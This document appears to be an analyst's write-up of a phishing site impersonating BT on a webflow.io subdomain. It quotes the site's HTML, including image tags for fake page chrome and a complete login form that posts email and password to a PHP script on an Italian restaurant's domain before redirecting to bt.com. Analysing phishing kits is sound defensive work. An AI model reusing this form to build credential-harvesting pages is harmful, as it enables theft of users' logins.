# Phishing - bt-billingpayment.webflow.io

## Introduction
Phishing site, disguising itself as a UK broadband company. The subdomain sounds believable enough, though the domain `webflow.io` gives it away.

<br/><br/><br/>

## Index page
A very poorly made login page, nothing is functional except 2 fields, `Username/Email` and `Password`, along with the `Login` button.

Headers, nav bars, and other functionalities present in the actual website are presented in screenshots. Below is the `<img>` tags pulled from the source code.

***header screenshot***
```html
<img src="https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31e114288b5dc2e7df79_btheader.jpg" loading="lazy" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31e114288b5dc2e7df79_btheader-p-500.jpeg 500w, https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31e114288b5dc2e7df79_btheader-p-800.jpeg 800w, https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31e114288b5dc2e7df79_btheader-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31e114288b5dc2e7df79_btheader-p-1600.jpeg 1600w, https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31e114288b5dc2e7df79_btheader.jpg 1920w" alt="" />
```

***sidebar screenshot***
```html
<img src="https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31e50bfc7d81af5f8560_btside.jpg" loading="lazy" sizes="(max-width: 479px) 96vw, (max-width: 767px) 97vw, 48vw" srcset="https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31e50bfc7d81af5f8560_btside-p-500.jpeg 500w, https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31e50bfc7d81af5f8560_btside.jpg 693w" alt="" />
```

***bottom bar screenshot***
```html
<img src="https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31ded19e954958252a30_bt-bottom.jpg" loading="lazy" sizes="(max-width: 1888px) 100vw, 1888px" srcset="https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31ded19e954958252a30_bt-bottom-p-500.jpeg 500w, https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31ded19e954958252a30_bt-bottom-p-800.jpeg 800w, https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31ded19e954958252a30_bt-bottom-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31ded19e954958252a30_bt-bottom-p-1600.jpeg 1600w, https://uploads-ssl.webflow.com/62ab31bfff6ad53767cbf8c1/62ab31ded19e954958252a30_bt-bottom.jpg 1888w" alt="" />
```

## Form

Below is the code for the phishing form. Note that it redirects to another domain. Visiting the domain reveals a seemingly legitamate Italian restaurant page. However, it should be noted that the page contains a video that cannot be loaded, and that the menu lists the dishes as costing `$0`.

```html
<div class="w-form">
    <form id="wf-form-Email" name="wf-form-Email" data-name="Email" redirect="https://bt.com" data-redirect="https://bt.com" action="https://ristorantedaluisa.it/wp-includes/opp/post.php" method="post">
        <h3>Log In</h3><label for="Email">Username/Email</label><input type="email" class="w-input" maxlength="256" name="Email" data-name="Email" placeholder="" id="Email" required="" /><label for="Password">Password</label><input type="password" class="w-input" maxlength="256" name="Password" data-name="Password" placeholder="" id="Password" required="" /><input type="submit" value="Login" data-wait="Please wait..." class="w-button" />
    </form>
    <div class="w-form-done">
        <div>Thank you! Your submission has been received!</div>
    </div>
    <div class="w-form-fail">
        <div>Oops! Something went wrong while submitting the form.</div>
    </div>
</div>
```

## Notes
In the source code (as well as from the domain), it can be deduced that the website was made using `webflow.com`

```html
<!-- This site was created in Webflow. http://www.webflow.com -->
<!-- Last Published: Thu Jun 16 2022 13:40:57 GMT+0000 (Coordinated Universal Time) -->
```